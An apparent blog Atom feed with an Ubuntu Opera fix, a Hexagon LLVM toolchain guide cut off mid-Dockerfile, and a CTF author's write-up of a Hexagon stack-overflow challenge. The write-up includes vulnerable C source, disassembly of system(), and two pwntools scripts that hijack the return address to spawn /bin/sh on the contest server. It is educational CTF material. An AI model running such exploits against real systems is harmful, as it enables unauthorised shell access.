<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C_LBY&#39;s BLOG</title>
  
  
  <link href="https://c-lby.top/atom.xml" rel="self"/>
  
  <link href="https://c-lby.top/"/>
  <updated>2025-03-12T10:02:06.853Z</updated>
  <id>https://c-lby.top/</id>
  
  <author>
    <name>鎏柏鱼</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>解决ubuntu桌面中opera浏览无法支持html5的问题</title>
    <link href="https://c-lby.top/2025/ubuntu-opera-html5/"/>
    <id>https://c-lby.top/2025/ubuntu-opera-html5/</id>
    <published>2025-03-12T09:48:19.000Z</published>
    <updated>2025-03-12T10:02:06.853Z</updated>
    
    <content type="html"><![CDATA[<p>昨天给一台笔记本装了一个纯净完整的Ubuntu24.04，中间遇到了很多软件适配问题。本文提出的问题截止目前为止，网上找不到有效的解决方案，因为ubuntu24太新了，很多包已经失效了。</p><p>当在ubuntu中用Opera浏览器打开B站看视频的时候会发现播放器提示“该浏览器不支持html5，请更换浏览器”等字样。这是因为opera在安装时有一个库没有安装。opera的内核也是基于谷歌的，因此解决方案是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install chromium-browser</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">cp</span> /snap/chromium/3060/usr/lib/chromium-browser/libffmpeg.so /usr/lib/x86_64-linux-gnu/opera/libffmpeg.so</span></span><br></pre></td></tr></table></figure><p>然后重启opera浏览器就OK了。其实网上有旧版本对于opera无法播放的解决办法，都是给opera补这个缺失的libc，但是旧版的谷歌浏览器安装好后lib文件在<code>/usr/lib/chromium-browser</code>，新版的位置发生了很大的改变，因此记录一下。</p>]]></content>
    
    
    <summary type="html">2025.03.12</summary>
    
    
    
    <category term="Linux" scheme="https://c-lby.top/categories/Linux/"/>
    
    
    <category term="ubuntu" scheme="https://c-lby.top/tags/ubuntu/"/>
    
    <category term="linux" scheme="https://c-lby.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>『2025VNCTF』hexagon出题小记&amp;&amp;hexagon架构一种新的利用方式</title>
    <link href="https://c-lby.top/2025/2025vnctf-hexagon/"/>
    <id>https://c-lby.top/2025/2025vnctf-hexagon/</id>
    <published>2025-02-08T12:58:41.000Z</published>
    <updated>2025-02-09T16:58:28.591Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前记"><a href="#0x00-前记" class="headerlink" title="0x00 前记"></a>0x00 前记</h2><p>大佬们轻点喷qaq</p><p>这是一道hexagon架构的pwn题，比较冷门，但漏洞很简单就是一个栈溢出。第一次见hexagon架构的pwn题是在2024年的geekctf上，具体关于hexagon程序运行、调试、栈迁移打法复现，可以看我的<a href="https://c-lby.top/2024/2024geekctf-stkbof/">这篇博客</a>（如果你是在做题的时候现学查到的先知那篇文章，没错那也是我的），这篇文章里其实还记录了新利用的发现，但是在比赛期间被我锁上了。</p><p>鉴于VNCTF是招新赛，也算是半个新生赛了（确信），所以题目难度降了又降。从一开始的极少栈空间，到给多一定栈空间可以有机会通过多次栈迁移攻击，到最后连log都给出来了，免去了选手爆破栈地址的痛苦，十个左右的解是符合预期的。</p><p>所以这道题总共有两种解法，虽然我很希望有选手能够通过除了栈迁移之外的打法做出这道题，但是遗憾的的是似乎大家都参照了先知的文章用栈迁移打通的。栈迁移打法的脚本在文章最后。</p><h2 id="0x01-程序运行与调试"><a href="#0x01-程序运行与调试" class="headerlink" title="0x01 程序运行与调试"></a>0x01 程序运行与调试</h2><ol><li>首先qemu-user的安装是有必要的，里面包含了qemu-hexagon，这是程序运行的基础设施</li><li>第二步是将libc链接到&#x2F;lib里<code>sudo ln -sf libc.so /lib/ld-musl-hexagon.so.1</code></li><li>第三步运行程序qemu-hexagon .&#x2F;main就能运行起来了</li><li>调试程序实测gdb-mutilarch用不了，所以建议不折腾用qemu本身的调试功能来调试，这里给出其中一种信息较详细的调试命令<code>qemu-hexagon -L libc -d in_asm,exec,cpu,page,nochain -singlestep -dfilter 0x20420+0xc0 -strace -D ./log ./main</code></li><li>题目没给出源码，如果要在IDA反汇编看代码，需要借助<a href="https://github.com/n-o-o-n/idp_hexagon/releases/download/v5.4/hexagon-ida83-v5.4.7z">插件</a></li></ol><h2 id="0x02-源码"><a href="#0x02-源码" class="headerlink" title="0x02 源码"></a>0x02 源码</h2><p>按照国际惯例先给出源码，其实也非常简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> vul_buf[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> pad;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> key;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line">    read(<span class="number">0</span>, vul_buf, <span class="number">16</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /home/ctf/log&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome back, hexagon player!&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-新的利用方式"><a href="#0x03-新的利用方式" class="headerlink" title="0x03 新的利用方式"></a>0x03 新的利用方式</h2><p>这可能并不能是新的利用方式，毕竟这种形式的类ogg在各个libc里都挺常见的，只是用的比较少。但至少在hexagon架构里有一定好处，hexagon的指令集中是没有pop和push的，所以不能像x86_64那样构造ROP直接控制寄存器，而是要通过栈（迁移）来控制寄存器。在<strong>栈容量较小的时候</strong>还是太吃操作了，主包还有没有更简单的方法。有的兄弟有的。</p><p>我们在libc.so中先找到&#x2F;bin&#x2F;sh，然后看他的引用，跳到system函数上，可以看到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:000BE7C0                 &#123; r3 = memw(fp + #var_42C) &#125;</span><br><span class="line">.text:000BE7C4                 &#123; r0 = add(pc, ##aSh@pcrel) &#125; // &quot;sh&quot;</span><br><span class="line">.text:000BE7CC                 &#123; memw(fp + #var_420) = r0 &#125;</span><br><span class="line">.text:000BE7D0                 &#123; r0 = add(pc, ##aC_0@pcrel) &#125; // &quot;-c&quot;</span><br><span class="line">.text:000BE7D8                 &#123; memw(fp + #var_41C) = r0 &#125;</span><br><span class="line">.text:000BE7DC                 &#123; r0 = memw(fp + #var_10) &#125;</span><br><span class="line">.text:000BE7E0                 &#123; memw(fp + #var_418) = r0 &#125;</span><br><span class="line">.text:000BE7E4                 &#123; r2 = #0 &#125;</span><br><span class="line">.text:000BE7E8                 &#123; memw(fp + #var_414) = r2 &#125;</span><br><span class="line">.text:000BE7EC                 &#123; r0 = add(pc, ##_GLOBAL_OFFSET_TABLE_@pcrel) &#125;</span><br><span class="line">.text:000BE7F4                 &#123; r0 = memw(r0 + ##-0x102F4) &#125;</span><br><span class="line">.text:000BE7FC                 &#123; r5 = memw(r0) &#125;</span><br><span class="line">.text:000BE800                 &#123; r1 = add(pc, ##aBinSh@pcrel) &#125; // &quot;/bin/sh&quot;</span><br><span class="line">.text:000BE808                 &#123; r0 = add(fp, #-0x14) &#125;</span><br><span class="line">.text:000BE80C                 &#123; r4 = add(fp, #-0x420) &#125;</span><br><span class="line">.text:000BE810                 &#123; call posix_spawn &#125;</span><br><span class="line">.text:000BE818                 &#123; r1 = r0 &#125;</span><br><span class="line">.text:000BE81C                 &#123; r0 = memw(fp + #var_42C) &#125;</span><br><span class="line">.text:000BE820                 &#123; memw(fp + #var_2C0) = r1 &#125;</span><br><span class="line">.text:000BE824                 &#123; call posix_spawnattr_destroy &#125;</span><br><span class="line">.text:000BE82C                 &#123; r0 = memw(fp + #var_2C0) &#125;</span><br><span class="line">.text:000BE830                 &#123; p0 = cmp.eq(r0, #0) &#125;</span><br><span class="line">.text:000BE834                 &#123; p0 = not(p0) &#125;</span><br><span class="line">.text:000BE838                 &#123; if (p0) jump loc_BE8A4 &#125;</span><br><span class="line">.text:000BE83C                 &#123; jump loc_BE840 &#125;</span><br><span class="line">.text:000BE840 // ---------------------------------------------------------------------------</span><br><span class="line">.text:000BE840</span><br><span class="line">.text:000BE840 loc_BE840:                              // CODE XREF: system+1CC↑j</span><br><span class="line">.text:000BE840                 &#123; jump loc_BE844 &#125;</span><br><span class="line">.text:000BE844 // ---------------------------------------------------------------------------</span><br><span class="line">.text:000BE844</span><br><span class="line">.text:000BE844 loc_BE844:                              // CODE XREF: system:loc_BE840↑j</span><br><span class="line">.text:000BE844                                         // system:loc_BE89C↓j</span><br><span class="line">.text:000BE844                 &#123; r0 = memw(fp + #var_14) &#125;</span><br><span class="line">.text:000BE848                 &#123; r1 = add(fp, #-0x2BC) &#125;</span><br><span class="line">.text:000BE84C                 &#123; r2 = #0 &#125;</span><br><span class="line">.text:000BE850                 &#123; call waitpid &#125;</span><br></pre></td></tr></table></figure><p>其实就是system函数执行命令的逻辑是<code>/bin/sh -c xxxx</code>，而这个xxxx命令会从fp-0x10中取。那么我只需要满足以下三点就能执行<code>/bin/sh -c /bin/sh</code>了</p><ol><li>栈上写0x3FED19F7（libcbase&#x3D;0x3FEC0000，则0x3FED19F7是&#x2F;bin&#x2F;sh字符串）</li><li>控制好fp（类似rbp寄存器）使得[fp-0x10]精准命中栈上的0x3FED19F7</li><li>劫持返回地址为libcbase+0xBE7C0，也就是上面这个gadget的开始（不同版本的libc偏移可能存在差异）</li></ol><p>也就是说我们只需要得知栈地址和libc地址就能轻松getshell，而这两个地址在qemu环境下一点也不难得知，更何况本题给出了log，log中记载了当次程序运行的所有系统调用情况，我们通过查看read调用就能找到栈地址。libc地址同理，有很多方法可以获取。这样的方法免去了调试栈迁移的痛苦。</p><p>hexagon这道题其实有点就题出题的意思在里面，给了scanf就是为了给选手输入0x3FED19F7到[fp-0x10]的（赤裸裸的明示）。实际上只要题目能够输入4*3字节并能覆盖fp和返回地址，就能使用这种方法getshell，或者执行其他命令。</p><h2 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04 EXP"></a>0x04 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process([&#x27;qemu-hexagon&#x27;, &#x27;-L&#x27;, &#x27;libc&#x27;, &#x27;-d&#x27;, &#x27;in_asm,exec,cpu,nochain&#x27;, &#x27;-singlestep&#x27;,</span></span><br><span class="line"><span class="comment">#             &#x27;-dfilter&#x27;, &#x27;0x20420+0xc0&#x27;, &#x27;-strace&#x27;, &#x27;-D&#x27;, &#x27;./log&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line">r = remote(<span class="string">&#x27;node.vnteam.cn&#x27;</span>, <span class="number">43815</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack = <span class="number">0x4080e9d8</span> <span class="comment"># 栈地址在ubuntu22的qemu下可能会变</span></span><br><span class="line">libc_base = <span class="number">0x3FEC0000</span> <span class="comment"># libc地址不会变</span></span><br><span class="line">binsh = libc_base+<span class="number">0x119f7</span></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(binsh).encode())</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0</span>)*<span class="number">2</span> + p32(stack+<span class="number">8</span>)+p32(libc_base+<span class="number">0xBE7C0</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x05-栈迁移方法的EXP"><a href="#0x05-栈迁移方法的EXP" class="headerlink" title="0x05 栈迁移方法的EXP"></a>0x05 栈迁移方法的EXP</h2><p>出题人最近比较忙所以直接贴出本题一血的栈迁移脚本。绝对不是因为出题人懒哟。绝对不是哟。</p><p>为了不误导大家，脚本中原先存在的部分注释被删掉了，请大家自行调试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;neww&#x27;</span>]</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">all_logs = []</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment"># sh = process(filename)</span></span><br><span class="line">    <span class="comment"># sh = process([&#x27;qemu-hexagon&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line">    sh = process([<span class="string">&#x27;qemu-hexagon&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>, <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;in_asm,exec,cpu,nochain&#x27;</span>, <span class="string">&#x27;-singlestep&#x27;</span>, <span class="string">&#x27;-dfilter&#x27;</span>, <span class="string">&#x27;0x20460+0x40&#x27;</span>, <span class="string">&#x27;-strace&#x27;</span>, <span class="string">&#x27;-D&#x27;</span>, <span class="string">&#x27;./log&#x27;</span>, <span class="string">&#x27;./main&#x27;</span>])</span><br><span class="line">    <span class="comment"># sh = process([&#x27;qemu-hexagon&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node.vnteam.cn&#x27;</span>, <span class="number">47998</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">params=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">for</span> an_log <span class="keyword">in</span> all_logs:</span><br><span class="line">        success(an_log)</span><br><span class="line">    pid = util.proc.pidof(sh)[<span class="number">0</span>]</span><br><span class="line">    gdb.attach(pid, params)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_info</span>(<span class="params">name, addr</span>):</span><br><span class="line">    output_log = <span class="string">&#x27;&#123;&#125; =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(addr))</span><br><span class="line">    all_logs.append(output_log)</span><br><span class="line">    success(output_log)</span><br><span class="line"></span><br><span class="line">stack_addr = <span class="number">0x4080f1c8</span></span><br><span class="line">libc_base= <span class="number">0x3FEC0000</span></span><br><span class="line">gadget1 = <span class="number">0x20534</span> <span class="comment"># r0 = memw(fp + #var_8) dealloc_return</span></span><br><span class="line">gadget2 = libc_base + <span class="number">0xDB2CC</span> <span class="comment"># r0 = memw(fp + #var_4) dealloc_return</span></span><br><span class="line">gadget3 = libc_base + <span class="number">0x54630</span> <span class="comment"># r0 = memw(fp -0x10 ) dealloc_return</span></span><br><span class="line">ret = <span class="number">0x20538</span></span><br><span class="line">bss = <span class="number">0x406d0</span></span><br><span class="line">bss = stack_addr</span><br><span class="line">target = <span class="number">0x1039E</span></span><br><span class="line">call_system = <span class="number">0x2048C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">str</span>(<span class="number">0x1000</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Welcome back, hexagon player!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss-<span class="number">0x30</span>+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p32(bss-<span class="number">0x20</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x4080f198</span>) + <span class="string">b&#x27;bbbb&#x27;</span> + p32(bss-<span class="number">0x10</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(<span class="number">0x2048C</span>) + p32(bss-<span class="number">0x10</span>) + p32(gadget3)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x30 /bin/sh          </span></span><br><span class="line"><span class="comment"># bss-0x2c xxxx</span></span><br><span class="line"><span class="comment"># bss-0x28 bss-0x20+8</span></span><br><span class="line"><span class="comment"># bss-0x24 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x20 0x4080f198       </span></span><br><span class="line"><span class="comment"># bss-0x1c bbbb</span></span><br><span class="line"><span class="comment"># bss-0x18 bss-0x10+8</span></span><br><span class="line"><span class="comment"># bss-0x14 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x10 sh          </span></span><br><span class="line"><span class="comment"># bss-0xc  0xdeadbeaf</span></span><br><span class="line"><span class="comment"># bss-8    bss-0x10</span></span><br><span class="line"><span class="comment"># bss-4    gadget3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss      aaaa              </span></span><br><span class="line"><span class="comment"># bss+4    aaaa</span></span><br><span class="line"><span class="comment"># bss+8    bss-0x30+8</span></span><br><span class="line"><span class="comment"># bss+0xc  start_read</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前记&quot;&gt;&lt;a href=&quot;#0x00-前记&quot; class=&quot;headerlink&quot; title=&quot;0x00 前记&quot;&gt;&lt;/a&gt;0x00 前记&lt;/h2&gt;&lt;p&gt;大佬们轻点喷qaq&lt;/p&gt;
&lt;p&gt;这是一道hexagon架构的pwn题，比较冷门，但漏洞很简单就是一个栈溢出。第一次见hexagon架构的pwn题是在2024年的geekctf上，具体关于hexagon程序运行、调试、栈迁移打法复现，可以看我的&lt;a href=&quot;https://c-lby.top/2024/2024geekctf-stkbof/&quot;&gt;这篇博客&lt;/a&gt;（如果你是在做题的时候现学查到的先知那篇文章，没错那也是我的），这篇文章里其实还记录了新利用的发现，但是在比赛期间被我锁上了。&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
    <category term="hexagon" scheme="https://c-lby.top/tags/hexagon/"/>
    
  </entry>
  
  <entry>
    <title>hexagon LLVM编译环境搭建</title>
    <link href="https://c-lby.top/2024/hexagon-toolchain-env/"/>
    <id>https://c-lby.top/2024/hexagon-toolchain-env/</id>
    <published>2024-12-12T09:01:10.000Z</published>
    <updated>2024-12-12T10:10:51.188Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><a href="https://github.com/quic/toolchain_for_hexagon">toolchain for hexagon</a>这是高通官方的hexagon架构编译工具链源码。是的没错你要自己编译这个环境。当然github上面也给出了编译好的release版本，开箱即用。经历一些波折之后我觉得似乎还是开箱即用比较方便（</p><p>搭建步骤大致如下：</p><ol><li>下载依赖项源码</li><li>设置依赖项源码路径的环境变量</li><li>逐项编译</li></ol><h2 id="在本地构建"><a href="#在本地构建" class="headerlink" title="在本地构建"></a>在本地构建</h2><p>local文件夹下的README有提到方法</p><p>首先要先安装依赖项，这些依赖在dockerfile中有提到</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bison \</span><br><span class="line">cmake \</span><br><span class="line">flex \</span><br><span class="line">rsync \</span><br><span class="line">wget \</span><br><span class="line">build-essential \</span><br><span class="line">python-is-python3 \</span><br><span class="line">python3.<span class="number">8</span> \</span><br><span class="line">python3.<span class="number">8</span>-venv \</span><br><span class="line">curl \</span><br><span class="line">xz-utils \</span><br><span class="line">zstd \</span><br><span class="line">ca-certificates \</span><br><span class="line">ccache \</span><br><span class="line">git \</span><br><span class="line">software-properties-common \</span><br><span class="line">bc \</span><br><span class="line">ninja-build \</span><br><span class="line">cpio \</span><br><span class="line">python3-psutil \</span><br><span class="line">unzip</span><br></pre></td></tr></table></figure><p>cmake如果直接用apt管理器下载版本会太旧，因此需要从kitware下载。后面将在容器里搭建会讲到。</p><p>然后运行脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./get-src-repos.sh $&#123;PWD&#125; $&#123;PWD&#125;/install/manifest     &lt;-获取源码</span><br><span class="line"></span><br><span class="line">cd llvm-test-suite</span><br><span class="line">git am ../test-suite-patches/0001-Add-cycle-read-for-hexagon.patch   &lt;-打个补丁</span><br><span class="line"></span><br><span class="line">TOOLCHAIN_INSTALL=$&#123;PWD&#125;/install \</span><br><span class="line">ROOT_INSTALL=$&#123;PWD&#125;/rootfs \</span><br><span class="line">ARTIFACT_BASE=$&#123;PWD&#125;/artifacts \</span><br><span class="line">ARTIFACT_TAG=main \</span><br><span class="line">    ./build-toolchain.sh     &lt;-设置变量后运行编译脚本</span><br></pre></td></tr></table></figure><p>编译好之后可以运行<code>test-toolchain.sh</code>来检验，变量在build脚本的基础上加多一个<code>TEST_TOOLCHAIN=1</code>即可。然后就可以使用<code>hexagon-unknown-linux-musl-clang(++)</code>来编译项目了。默认是没有开PIE和canary的，partial relro。虽然hexagon是有类似保护机制的，还有待探究。</p><h2 id="在容器构建"><a href="#在容器构建" class="headerlink" title="在容器构建"></a>在容器构建</h2><p>需要设置一个变量<code>ARTIFACT_TAG</code>，可以划分版本。比如现在hexagon最新可稳定支持的版本是19.1.5。不同版本的源码可以在项目分支tags中找到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export ARTIFACT_TAG=19.1.5</span><br><span class="line"></span><br><span class="line">./build-in-container.sh</span><br></pre></td></tr></table></figure><p>这样就可以自动构建了。编译时间很长需要耐心等待。</p><p>dockerfile由于网络问题，有些地方需要进行修改。以下是我给出可以在国内正常下载的修改过的dockerfile：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 